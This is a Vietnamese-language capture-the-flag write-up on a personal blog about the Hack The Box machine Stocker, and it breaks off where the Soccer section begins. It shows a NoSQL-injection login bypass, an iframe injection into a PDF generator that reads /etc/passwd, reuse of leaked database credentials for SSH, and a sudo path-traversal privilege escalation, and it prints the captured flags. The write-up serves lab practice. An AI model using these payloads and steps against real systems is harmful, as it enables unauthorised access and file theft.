

<!DOCTYPE html>
<html lang="en" itemscope itemtype="http://schema.org/WebPage">
  <head>
    

  <meta charset="utf-8" />
  <meta http-equiv="X-UA-Compatible" content="IE=edge">
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0">

  <title>Hackthebox some easy machine - &gt; root@l3mnt2010:~# ./exploit.py</title>
  <meta name="description" content="Hackthebox some easy machine  Soccer  80/http   Precious Editorial    .toc-container {position: fixed;left: 0;top: 100px; width: 350px; max-height: 80vh;overflow-y: auto;overflow-x: auto;padding: 20px;border-right: 1px solid #eee;background-color: black; z-index: 100;text-align: left; }.toc {font-size: 1.3rem; color: #fff; text-align: left; }.toc h4 {margin-top: 0;margin-bottom: 1rem;font-size: 1.3rem; text-align: left; }.">
  <meta name="author" content="l3mnt2010"/><script type="application/ld+json">
{
    "@context": "http://schema.org",
    "@type": "WebSite",
    "name": "\u003e root@l3mnt2010:~# .\/exploit.py",
    
    "url": "https:\/\/l3mnt2010.github.io\/"
}
</script><script type="application/ld+json">
{
  "@context": "http://schema.org",
  "@type": "Organization",
  "name": "",
  "url": "https:\/\/l3mnt2010.github.io\/"
  
  
  
  
}
</script>
<script type="application/ld+json">
{
  "@context": "http://schema.org",
  "@type": "BreadcrumbList",
  "itemListElement": [{
        "@type": "ListItem",
        "position": 1,
        "item": {
          "@id": "https:\/\/l3mnt2010.github.io\/",
          "name": "home"
        }
    },{
        "@type": "ListItem",
        "position": 3,
        "item": {
          "@id": "https:\/\/l3mnt2010.github.io\/write-up\/2024-05-14-htb-machine\/",
          "name": "Hackthebox some easy machine"
        }
    }]
}
</script><script type="application/ld+json">
{
  "@context": "http://schema.org",
  "@type": "Article",
  "author": {
    "name" : ""
  },
  "headline": "Hackthebox some easy machine",
  "description" : "Hackthebox some easy machine  Soccer  80\/http   Precious Editorial    \r\r\r\r\r.toc-container {\rposition: fixed;\rleft: 0;\rtop: 100px; width: 350px; max-height: 80vh;\roverflow-y: auto;\roverflow-x: auto;\rpadding: 20px;\rborder-right: 1px solid #eee;\rbackground-color: black; z-index: 100;\rtext-align: left; }\r.toc {\rfont-size: 1.3rem; color: #fff; text-align: left; }\r.toc h4 {\rmargin-top: 0;\rmargin-bottom: 1rem;\rfont-size: 1.3rem; text-align: left; }\r.",
  "inLanguage" : "en",
  "wordCount":  2776 ,
  "datePublished" : "0001-01-01T00:00:00\u002b00:00",
  "dateModified" : "0001-01-01T00:00:00\u002b00:00",
  "image" : "https:\/\/l3mnt2010.github.io\/avatar.png",
  "keywords" : [ "CTF, Vietnamese" ],
  "mainEntityOfPage" : "https:\/\/l3mnt2010.github.io\/write-up\/2024-05-14-htb-machine\/",
  "publisher" : {
    "@type": "Organization",
    "name" : "https:\/\/l3mnt2010.github.io\/",
    "logo" : {
        "@type" : "ImageObject",
        "url" : "https:\/\/l3mnt2010.github.io\/avatar.png",
        "height" :  60 ,
        "width" :  60
    }
  }
}
</script>


<meta property="og:title" content="Hackthebox some easy machine" />
<meta property="og:description" content="Hackthebox some easy machine  Soccer  80/http   Precious Editorial    .toc-container {position: fixed;left: 0;top: 100px; width: 350px; max-height: 80vh;overflow-y: auto;overflow-x: auto;padding: 20px;border-right: 1px solid #eee;background-color: black; z-index: 100;text-align: left; }.toc {font-size: 1.3rem; color: #fff; text-align: left; }.toc h4 {margin-top: 0;margin-bottom: 1rem;font-size: 1.3rem; text-align: left; }.">
<meta property="og:image" content="https://l3mnt2010.github.io/avatar.png" />
<meta property="og:url" content="https://l3mnt2010.github.io/write-up/2024-05-14-htb-machine/" />
<meta property="og:type" content="website" />
<meta property="og:site_name" content="&gt; root@l3mnt2010:~# ./exploit.py" />

  <meta name="twitter:title" content="Hackthebox some easy machine" />
  <meta name="twitter:description" content="Hackthebox some easy machine  Soccer  80/http   Precious Editorial    .toc-container {position: fixed;left: 0;top: 100px; width: 350px; max-height: 80vh;overflow-y: auto;overflow-x: auto; …">
  <meta name="twitter:image" content="https://l3mnt2010.github.io/avatar.png" />
  <meta name="twitter:card" content="summary_large_image" />
  <link href='https://l3mnt2010.github.io/avatar.png' rel='icon' type='image/x-icon'/>
  <meta name="generator" content="Hugo 0.83.1" />
  <link rel="alternate" href="https://l3mnt2010.github.io/index.xml" type="application/rss+xml" title="&gt; root@l3mnt2010:~# ./exploit.py"><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.10.0/katex.min.css" integrity="sha384-9eLZqc9ds8eNjO3TmqPeYcDj8n+Qfa4nuSiGYa6DjLNcv9BtN69ZIulL9+8CqC9Y" crossorigin="anonymous">
  <link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.5.0/css/all.css" integrity="sha384-B4dIYHKNBt8Bc12p+WXckhzcICo0wtJAoU8YZTY5qE0Id1GSseTk6S+L3BlXeVIU" crossorigin="anonymous">
  <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/css/bootstrap.min.css" integrity="sha384-BVYiiSIFeK1dGmJRAkycuHAHRg32OmUcww7on3RYdg4Va+PmSTsz/K68vbdEjh4u" crossorigin="anonymous"><link rel="stylesheet" href="https://l3mnt2010.github.io/css/main.css" /><link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Lora:400,700,400italic,700italic" />
  <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Open+Sans:300italic,400italic,600italic,700italic,800italic,400,300,600,700,800" /><link rel="stylesheet" href="https://l3mnt2010.github.io/css/syntax.css" /><link rel="stylesheet" href="https://l3mnt2010.github.io/css/codeblock.css" /><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/photoswipe/4.1.2/photoswipe.min.css" integrity="sha384-h/L2W9KefUClHWaty3SLE5F/qvc4djlyR4qY3NUV5HGQBBW7stbcfff1+I/vmsHh" crossorigin="anonymous">
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/photoswipe/4.1.2/default-skin/default-skin.min.css" integrity="sha384-iD0dNku6PYSIQLyfTOpB06F2KCZJAKLOThS5HRe8b3ibhdEQ6eKsFf/EeFxdOt5R" crossorigin="anonymous">



  </head>
  <body>
    <nav class="navbar navbar-default navbar-fixed-top navbar-custom">
  <div class="container-fluid">
    <div class="navbar-header">
      <button type="button" class="navbar-toggle" data-toggle="collapse" data-target="#main-navbar">
        <span class="sr-only">Toggle navigation</span>
        <span class="icon-bar"></span>
        <span class="icon-bar"></span>
        <span class="icon-bar"></span>
      </button>
      <a class="navbar-brand" href="https://l3mnt2010.github.io/">&gt; root@l3mnt2010:~# ./exploit.py</a>
    </div>

    <div class="collapse navbar-collapse" id="main-navbar">
      <ul class="nav navbar-nav navbar-right">
        
          
            <li>
              <a title="Home" href="https://l3mnt2010.github.io/">Home</a>
            </li>
          
        
          
            <li>
              <a title="Posts" href="https://l3mnt2010.github.io/posts">Posts</a>
            </li>
          
        
          
            <li>
              <a title="Write-up CTF" href="https://l3mnt2010.github.io/write-up">Write-up CTF</a>
            </li>
          
        
          
            <li>
              <a title="Tags" href="https://l3mnt2010.github.io/tags">Tags</a>
            </li>
          
        
          
            <li>
              <a title="About" href="https://l3mnt2010.github.io/about">About</a>
            </li>
          
        

        

        
      </ul>
    </div>

    
      <div class="avatar-container">
        <div class="avatar-img-border">
          <a title="&gt; root@l3mnt2010:~# ./exploit.py" href="https://l3mnt2010.github.io/">
            <img class="avatar-img" src="https://l3mnt2010.github.io/avatar.png" alt="&gt; root@l3mnt2010:~# ./exploit.py" />
           
          </a>
        </div>
      </div>
    

  </div>
</nav>




    


<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">

<div class="pswp__bg"></div>

<div class="pswp__scroll-wrap">
    
    <div class="pswp__container">
      <div class="pswp__item"></div>
      <div class="pswp__item"></div>
      <div class="pswp__item"></div>
    </div>
    
    <div class="pswp__ui pswp__ui--hidden">
    <div class="pswp__top-bar">
      
      <div class="pswp__counter"></div>
      <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
      <button class="pswp__button pswp__button--share" title="Share"></button>
      <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
      <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
      
      
      <div class="pswp__preloader">
        <div class="pswp__preloader__icn">
          <div class="pswp__preloader__cut">
            <div class="pswp__preloader__donut"></div>
          </div>
        </div>
      </div>
    </div>
    <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
      <div class="pswp__share-tooltip"></div>
    </div>
    <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
    </button>
    <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
    </button>
    <div class="pswp__caption">
      <div class="pswp__caption__center"></div>
    </div>
    </div>
    </div>
</div>


  
  
  






  

  <header class="header-section ">
    
    
    <div class="intro-header no-img">
      <div class="container">
        <div class="row">
          <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
            <div class="write-up-heading">
              
                <h1>Hackthebox some easy machine</h1>
              
              
                <hr class="small">
              
              
              
            </div>
          </div>
        </div>
      </div>
    </div>
  
  </header>


    
<div class="container" role="main">
  <div class="row">
    <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
      <article role="main" class="blog-post">
        
  <div class="toc-container">
    <div class="toc">
      <nav id="TableOfContents">
        
        <nav id="TableOfContents">
  <ol>
    <li><a href="#hackthebox-some-easy-machine">Hackthebox some easy machine</a>
      <ol>
        <li><a href="#soccer">Soccer</a>
          <ol>
            <li><a href="#80http">80/http</a></li>
          </ol>
        </li>
        <li><a href="#precious">Precious</a></li>
        <li><a href="#editorial">Editorial</a></li>
      </ol>
    </li>
  </ol>
</nav>
      </nav>
    </div>
  </div>

  <style>
     
    .toc-container {
      position: fixed;
      left: 0;
      top: 100px;  
      width: 350px;  
      max-height: 80vh;
      overflow-y: auto;
      overflow-x: auto;
      padding: 20px;
      border-right: 1px solid #eee;
      background-color: black;  
      z-index: 100;
      text-align: left;  
    }

    .toc {
      font-size: 1.3rem;  
      color: #fff;  
      text-align: left;  
    }

    .toc h4 {
      margin-top: 0;
      margin-bottom: 1rem;
      font-size: 1.3rem;  
      text-align: left;  
    }

     
    .toc ul, .toc ol {
      padding-left: 0;  
      margin: 0;
      list-style-type: none;
      text-align: left;  
    }

     
    .toc ul ul, .toc ul ol, .toc ol ul, .toc ol ol {
      padding-left: 10px;
    }

    .toc li {
      padding: 10px 0;
      line-height: 1.6;
      text-align: left;  
    }

     
    .toc a {
      text-decoration: none;
      display: block;
      text-align: left;  
      padding-left: 3px;  
      font-size: 1.3rem;  
      transition: color 0.2s;
    }

     
    .toc > nav > ul > li > a {
      color: #bb86fc;  
      font-weight: bold;
    }

     
    .toc > nav > ul > li > ul > li > a {
      color: #ff4d4d;  
    }

     
    .toc > nav > ul > li > ul > li > ul > li > a {
      color: #4caf50;  
    }

     
    .toc a:hover {
      color: #ffcc00;  
    }

     
    .toc a.active {
      color: #ffcc00;  
      font-weight: bold;
      border-left: 4px solid #ffcc00;  
      padding-left: 3px;  
      margin-left: -5px;
    }

     
    .main-content {
      margin-left: 380px;  
    }

     
    @media (max-width: 1200px) {
      .toc-container {
        width: 280px;  
      }
      .main-content {
        margin-left: 320px;
      }
    }

    @media (max-width: 900px) {
      .toc-container {
        position: static;
        width: 100%;
        max-height: none;
        border-right: none;
        border-bottom: 1px solid #eee;
        margin-bottom: 20px;
      }
      .main-content {
        margin-left: 0;
      }
    }
  </style>

  <script>
    document.addEventListener('DOMContentLoaded', function() {
      
      function highlightTOC() {
        const headings = document.querySelectorAll('.main-content h1, .main-content h2, .main-content h3, .main-content h4, .main-content h5, .main-content h6');
        const tocLinks = document.querySelectorAll('.toc a');

        if (headings.length === 0 || tocLinks.length === 0) return;

        let currentActiveIndex = -1;
        const scrollPosition = window.scrollY;

        for (let i = 0; i < headings.length; i++) {
          const heading = headings[i];
          const headingTop = heading.offsetTop - 100;
          const headingBottom = headingTop + heading.offsetHeight;

          if (scrollPosition >= headingTop && scrollPosition <= headingBottom) {
            currentActiveIndex = i;
            break;
          }
        }

        tocLinks.forEach(link => link.classList.remove('active'));

        if (currentActiveIndex >= 0) {
          const currentHeading = headings[currentActiveIndex];
          const headingId = currentHeading.id;

          const correspondingLink = document.querySelector(`.toc a[href="#${headingId}"]`);
          if (correspondingLink) {
            correspondingLink.classList.add('active');

            const tocContainer = document.querySelector('.toc-container');
            const linkTop = correspondingLink.offsetTop;
            const containerScrollTop = tocContainer.scrollTop;
            const containerHeight = tocContainer.clientHeight;

            if (linkTop < containerScrollTop || linkTop > containerScrollTop + containerHeight) {
              tocContainer.scrollTop = linkTop - containerHeight / 2;
            }
          }
        }
      }

      highlightTOC();
      window.addEventListener('scroll', highlightTOC);
      window.addEventListener('resize', highlightTOC);

      const fragment = window.location.hash;
      if (fragment) {
        const element = document.querySelector(fragment);
        if (element) {
          element.scrollIntoView({ behavior: 'smooth' });

          const tocLinks = document.querySelectorAll('.toc a');
          tocLinks.forEach(link => {
            link.classList.remove('active');
            if (link.getAttribute('href') === fragment) {
              link.classList.add('active');
            }
          });

          highlightTOC();
        }
      }

      const tocLinks = document.querySelectorAll('.toc a');
      tocLinks.forEach(link => {
        link.addEventListener('click', function(event) {
          const targetId = link.getAttribute('href').substring(1);
          const targetElement = document.getElementById(targetId);

          if (targetElement) {
            targetElement.scrollIntoView({ behavior: 'smooth' });

            tocLinks.forEach(l => l.classList.remove('active'));
            link.classList.add('active');

            history.pushState(null, null, `#${targetId}`);

            event.preventDefault();
          }
        });
      });
    });
  </script>  


<!-- raw HTML omitted -->
<h1 id="hackthebox-some-easy-machine">Hackthebox some easy machine</h1>
<pre><code>POST /login HTTP/1.1
Host: dev.stocker.htb
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:130.0) Gecko/20100101 Firefox/130.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: application/json
Content-Length: 55
Origin: http://dev.stocker.htb
Connection: close
Referer: http://dev.stocker.htb/login
Cookie: connect.sid=s%3AVKqxf1CbQcRK0LQcs4q8uXjL8AMGIYSf.hnzIXLK5fbo0Q7ZOe28EjtHvb%2BcXTeTsIpOeYTwHwsE
Upgrade-Insecure-Requests: 1
Priority: u=0, i

{&quot;username&quot;: {&quot;$ne&quot;: null}, &quot;password&quot;: {&quot;$ne&quot;: null} }
</code></pre><p><img src="https://hackmd.io/_uploads/S1Il8LxAC.png" alt="image"></p>
<p><img src="https://hackmd.io/_uploads/H16zD8xAC.png" alt="image"></p>
<p>Chức năng cơ bản là ta có thể thêm đồ vào giỏ hàng sau đó sẽ order và click vào here ta sẽ thấy có một mẫu kiểu pdf để hiển thị thông tin các sản phẩm và giá -&gt; nghĩ đến lỗi ssrf của file pdf</p>
<p><a href="https://github.com/gotenberg/gotenberg/issues/261">https://github.com/gotenberg/gotenberg/issues/261</a></p>
<p>-&gt; sau đó mình thử dùng payload này hiển thị /etc/passwd vào phần title</p>
<pre><code>POST /api/order HTTP/1.1
Host: dev.stocker.htb
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:130.0) Gecko/20100101 Firefox/130.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: http://dev.stocker.htb/stock
Content-Type: application/json
Content-Length: 228
Origin: http://dev.stocker.htb
Connection: close
Cookie: connect.sid=s%3AGvaVmAcZg7CngZbFx-15f4bHmrL2J6Ep.ucZMw6OE5hKJbuUCTyvLPFspYHHV%2BNmXq9dplQaU3c4
Priority: u=0

{&quot;basket&quot;:[{&quot;_id&quot;:&quot;638f116eeb060210cbd83a8d&quot;,&quot;title&quot;:&quot;&lt;iframe src='file:///etc/passwd' style=\&quot;width:100%; height:700px;\&quot;&gt;&quot;,&quot;description&quot;:&quot;It's a red cup.&quot;,&quot;image&quot;:&quot;red-cup.jpg&quot;,&quot;price&quot;:32,&quot;currentStock&quot;:4,&quot;__v&quot;:0,&quot;amount&quot;:1}]}
</code></pre><p><img src="https://hackmd.io/_uploads/Hy6hUWWR0.png" alt="image"></p>
<p>mở pdf lên -&gt;</p>
<p><img src="https://hackmd.io/_uploads/r1BALbZ00.png" alt="image"></p>
<p>lưu ý là phải tăng chiều dài và chiều rộng của iframe để có thể xem hết nội dung không nó sẽ bị lấp.</p>
<p>tạm thời để nội dung file /etc/passwd lại đây:</p>
<pre><code>root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List
Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System
(admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/no
login
systemd-network:x:100:102:systemd Network
Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:101:103:systemd
Resolver,,,:/run/systemd:/usr/sbin/nologin
systemd-timesync:x:102:104:systemd Time
Synchronization,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:103:106::/nonexistent:/usr/sbin/nologin
syslog:x:104:110::/home/syslog:/usr/sbin/nologin
_apt:x:105:65534::/nonexistent:/usr/sbin/nologin
tss:x:106:112:TPM software
stack,,,:/var/lib/tpm:/bin/false
uuidd:x:107:113::/run/uuidd:/usr/sbin/nologin
tcpdump:x:108:114::/nonexistent:/usr/sbin/nologin
landscape:x:109:116::/var/lib/landscape:/usr/sbin/nol
ogin
pollinate:x:110:1::/var/cache/pollinate:/bin/false
sshd:x:111:65534::/run/sshd:/usr/sbin/nologin
systemd-coredump:x:999:999:systemd Core
Dumper:/:/usr/sbin/nologin
fwupd-refresh:x:112:119:fwupd-refresh
user,,,:/run/systemd:/usr/sbin/nologin
mongodb:x:113:65534::/home/mongodb:/usr/sbin/nologin
angoose:x:1001:1001:,,,:/home/angoose:/bin/bash
_laurel:x:998:998::/var/log/laurel:/bin/fals
</code></pre><p>Vì chưa biết file index nằm ở đâu nên ta sẽ bỏ dấu Ư của json -&gt; json parser sẽ bị sai và báo lỗi</p>
<p><img src="https://hackmd.io/_uploads/SJ6kAZbRA.png" alt="image"></p>
<p>-&gt; path là /var/ww/dev/</p>
<p>-&gt; đọc file index.js</p>
<p><img src="https://hackmd.io/_uploads/rkPrCZbC0.png" alt="image"></p>
<pre><code>const express = require(&quot;express&quot;);
const mongoose = require(&quot;mongoose&quot;);
const session = require(&quot;express-session&quot;);
const MongoStore = require(&quot;connect-mongo&quot;);
const path = require(&quot;path&quot;);
const fs = require(&quot;fs&quot;);
const { generatePDF, formatHTML } = require(&quot;./pdf.js&quot;);
const { randomBytes, createHash } = require(&quot;crypto&quot;);
const app = express();
const port = 3000;
// TODO: Configure loading from dotenv for production
const dbURI = &quot;mongodb://dev:IHeardPassphrasesArePrettySecure@localhost/dev?authSource=admin&amp;w=1&quot;;
app.use(express.json());
app.use(express.urlencoded({ extended: false }));
app.use(
session({
secret: randomBytes(32).toString(&quot;hex&quot;),
resave: false,
saveUninitialized: true,
store: MongoStore.create({
mongoUrl: dbURI,
}),
})
);
app.use(&quot;/static&quot;, express.static(__dirname + &quot;/assets&quot;));
app.get(&quot;/&quot;, (req, res) =&gt; {
return res.redirect(&quot;/login&quot;);
});
app.get(&quot;/api/products&quot;, async (req, res) =&gt; {
if (!req.session.user) return res.json([]);
const products = await mongoose.model(&quot;Product&quot;).find();
return res.json(products);
});
app.get(&quot;/login&quot;, (req, res) =&gt; {
if (req.session.user) return res.redirect(&quot;/stock&quot;);
return res.sendFile(__dirname + &quot;/templates/login.html&quot;);
});
app.post(&quot;/login&quot;, async (req, res) =&gt; {
const { username, password } = req.body;
if (!username || !password) return res.redirect(&quot;/login?error=login-error&quot;);
// TODO: Implement hashing
const user = await mongoose.model(&quot;User&quot;).findOne({ username, password });
if (!user) return res.redirect(&quot;/login?error=login-error&quot;);
req.session.user = user.id;
console.log(req.session);
return res.redirect(&quot;/stock&quot;);
});
.....
</code></pre><p>ở đây có thể thấy server sử dụng mongodb với username là dev và password là <code>IHeardPassphrasesArePrettySecure</code>
để ý trên /etc/password có một người dùng là <code>angoose:x:1001:1001:,,,:/home/angoose:/bin/bash</code> khả năng cao là tài khoản ssh</p>
<p>-&gt; ta thử ssh vào:</p>
<pre><code>l3mnt2010@ASUSEXPERTBOOK:~$ nmap -sV 10.129.82.121
Starting Nmap 7.80 ( https://nmap.org ) at 2024-09-25 11:35 +07
Nmap scan report for dev.stocker.htb (10.129.82.121)
Host is up (0.055s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 9.95 seconds
l3mnt2010@ASUSEXPERTBOOK:~$ ssh angoose@10.129.82.121
The authenticity of host '10.129.82.121 (10.129.82.121)' can't be established.
ED25519 key fingerprint is SHA256:jqYjSiavS/WjCMCrDzjEo7AcpCFS07X3OLtbGHo/7LQ.
This key is not known by any other names
Are you sure you want to continue connecting (yes/no/[fingerprint])? SHA256:jqYjSiavS/WjCMCrDzjEo7AcpCFS07X3OLtbGHo/7LQ
Warning: Permanently added '10.129.82.121' (ED25519) to the list of known hosts.
angoose@10.129.82.121's password:
angoose@stocker:~$ ls
user.txt
angoose@stocker:~$ whoami
angoose
angoose@stocker:~$ cat user.txt
295e1168a278ba6d26077d4dee50a132
angoose@stocker:~$

</code></pre><p>thành công lấy user flag:</p>
<p><img src="https://hackmd.io/_uploads/rkmQIzZ0R.png" alt="image"></p>
<p>Tiếp theo sẽ leo quyền lên root:</p>
<pre><code>Người dùng angoose có quyền chạy các lệnh cụ thể với quyền sudo.
Cụ thể, người dùng có thể chạy bất kỳ tệp .js nào trong thư mục /usr/local/scripts/ bằng lệnh /usr/bin/node. Điều này nghĩa là angoose có quyền sử dụng sudo để thực thi các script JavaScript với Node.js trong đường dẫn được chỉ định, không cần cung cấp thêm mật khẩu cho mỗi lần thực thi lệnh đó.
</code></pre><p>-&gt; bây giờ thì ta tạo một file js với user này sau đó chạy nó bằng /usr/bin/node</p>
<pre><code>angoose@stocker:~$ sudo -l
[sudo] password for angoose:
Matching Defaults entries for angoose on stocker:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User angoose may run the following commands on stocker:
    (ALL) /usr/bin/node /usr/local/scripts/*.js
angoose@stocker:~$ nano sol.js
angoose@stocker:~$ cat sol.js
const fs = require('fs');
fs.readFile(''/root/root.txt', 'utf8', (err, data) =&gt; {
 if (err) throw err;
 console.log(data);
});
angoose@stocker:~$ node sol.js
/home/angoose/sol.js:2
fs.readFile(''/root/root.txt', 'utf8', (err, data) =&gt; {
                         ^^^

SyntaxError: missing ) after argument list
    at Object.compileFunction (node:vm:360:18)
    at wrapSafe (node:internal/modules/cjs/loader:1088:15)
    at Module._compile (node:internal/modules/cjs/loader:1123:27)
    at Module._extensions..js (node:internal/modules/cjs/loader:1213:10)
    at Module.load (node:internal/modules/cjs/loader:1037:32)
    at Module._load (node:internal/modules/cjs/loader:878:12)
    at Function.executeUserEntryPoint [as runMain] (node:internal/modules/run_main:81:12)
    at node:internal/main/run_main_module:23:47

Node.js v18.12.1
angoose@stocker:~$ rm sol.js
angoose@stocker:~$ nano sol.js
angoose@stocker:~$ node sol.js
/home/angoose/sol.js:3
  if (err) throw err;
           ^

[Error: EACCES: permission denied, open '/root/root.txt'] {
  errno: -13,
  code: 'EACCES',
  syscall: 'open',
  path: '/root/root.txt'
}

Node.js v18.12.1
angoose@stocker:~$ ls
sol.js  user.txt
angoose@stocker:~$ sudo node /usr/local/scripts/../../../home/angoose/sol.js
7a511b0d5a0c0a3c6e5f148bb9d18f16

angoose@stocker:~$
</code></pre><p>flag root: <code>7a511b0d5a0c0a3c6e5f148bb9d18f16</code></p>
<p><img src="https://hackmd.io/_uploads/SkqSFMbCA.png" alt="image"></p>
<p>ngoài ra ta sẽ đi phân tích lại sao lại dính ssrf ở trên:</p>
<pre><code>angoose@stocker:/var/www/dev$ cat package
cat: package: No such file or directory
angoose@stocker:/var/www/dev$ cat package.json
{
  &quot;name&quot;: &quot;stocker&quot;,
  &quot;version&quot;: &quot;1.0.0&quot;,
  &quot;description&quot;: &quot;&quot;,
  &quot;main&quot;: &quot;index.js&quot;,
  &quot;scripts&quot;: {
    &quot;test&quot;: &quot;echo \&quot;Error: no test specified\&quot; &amp;&amp; exit 1&quot;,
    &quot;dev&quot;: &quot;nodemon index.js&quot;
  },
  &quot;keywords&quot;: [],
  &quot;author&quot;: &quot;&quot;,
  &quot;license&quot;: &quot;ISC&quot;,
  &quot;dependencies&quot;: {
    &quot;connect-mongo&quot;: &quot;^4.6.0&quot;,
    &quot;express&quot;: &quot;^4.18.2&quot;,
    &quot;express-session&quot;: &quot;^1.17.3&quot;,
    &quot;md5&quot;: &quot;^2.3.0&quot;,
    &quot;mongoose&quot;: &quot;^6.7.5&quot;,
    &quot;puppeteer&quot;: &quot;^19.3.0&quot;
  },
  &quot;devDependencies&quot;: {
    &quot;nodemon&quot;: &quot;^2.0.20&quot;
  }
}
</code></pre><p>ở đây có dùng</p>
<pre><code>    browser = await puppeteer.launch({
      headless: true,
      pipe: true,
      args: [&quot;--no-sandbox&quot;, &quot;--disable-setuid-sandbox&quot;, &quot;--js-flags=--noexpose_wasm,--jitless&quot;, &quot;--allow-file-access-from-files&quot;],
      dumpio: true,
    });
</code></pre><p>thêm cả :-1:</p>
<pre><code>const formatHTML = (order) =&gt; {
  const poTemplate = fs.readFileSync(__dirname + &quot;/templates/order.html&quot;).toString();

  return poTemplate
    .replace(
      &quot;THETABLE&quot;,
      `              &lt;table style=&quot;width: 100%&quot;&gt;
&lt;thead&gt;
  &lt;tr&gt;
    &lt;th scope=&quot;col&quot;&gt;Item&lt;/th&gt;
    &lt;th scope=&quot;col&quot;&gt;Price (£)&lt;/th&gt;
    &lt;th scope=&quot;col&quot;&gt;Quantity&lt;/th&gt;
  &lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody id=&quot;cart-table&quot;&gt;
  ${order.items.map(
    (item) =&gt; `&lt;tr&gt;
      &lt;th scope=&quot;col&quot;&gt;${item.title}&lt;/th&gt;
      &lt;th scope=&quot;col&quot; id=&quot;cart-total&quot;&gt;${parseFloat(item.price).toFixed(2)}&lt;/th&gt;
      &lt;th scope=&quot;col&quot;&gt;${item.amount}&lt;/th&gt;
  &lt;/tr&gt;`
  )}
  &lt;tr&gt;
      &lt;td colspan=&quot;3&quot;&gt;&lt;hr/&gt;&lt;/td&gt;
  &lt;/tr&gt;
  &lt;tr&gt;
    &lt;th scope=&quot;col&quot;&gt;Total&lt;/th&gt;
    &lt;th scope=&quot;col&quot; id=&quot;cart-total&quot;&gt;${order.items
      .map((item) =&gt; parseFloat(item.price) * item.amount)
      .reduce((a, b) =&gt; a + b, 0)
      .toFixed(2)}&lt;/th&gt;
    &lt;th scope=&quot;col&quot;&gt;&lt;/th&gt;
  &lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;`
    )
    .replace(&quot;THEDATE&quot;, new Date().toLocaleDateString());
};
</code></pre><p>ở đây có thể thấy nó thực hiện chèn trực tiếp nên có thể inject được mã html và cụ thể là iframe như ta nói ở trên</p>
<h2 id="soccer">Soccer</h2>
<pre><code>l3mnt2010@ASUSEXPERTBOOK:~$ nmap -sV 10.129.8.232
Starting Nmap 7.80 ( https://nmap.org ) at 2024-09-25 12:13 +07
Nmap scan report for 10.129.8.232
Host is up (0.062s latency).
Not shown: 997 closed ports
PORT     STATE SERVICE         VERSION
22/tcp   open  ssh             OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
80/tcp   open  http            nginx 1.18.0 (Ubuntu)
9091/tcp open  xmltec-xmlmail?
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port9091-TCP:V=7.80%I=7%D=9/25%Time=66F39C0E%P=x86_64-pc-linux-gnu%r(in
SF:formix,2F,&quot;HTTP/1\.1\x20400\x20Bad\x20Request\r\nConnection:\x20close\r
SF:\n\r\n&quot;)%r(drda,2F,&quot;HTTP/1\.1\x20400\x20Bad\x20Request\r\nConnection:\x
SF:20close\r\n\r\n&quot;)%r(GetRequest,168,&quot;HTTP/1\.1\x20404\x20Not\x20Found\r\
SF:nContent-Security-Policy:\x20default-src\x20'none'\r\nX-Content-Type-Op
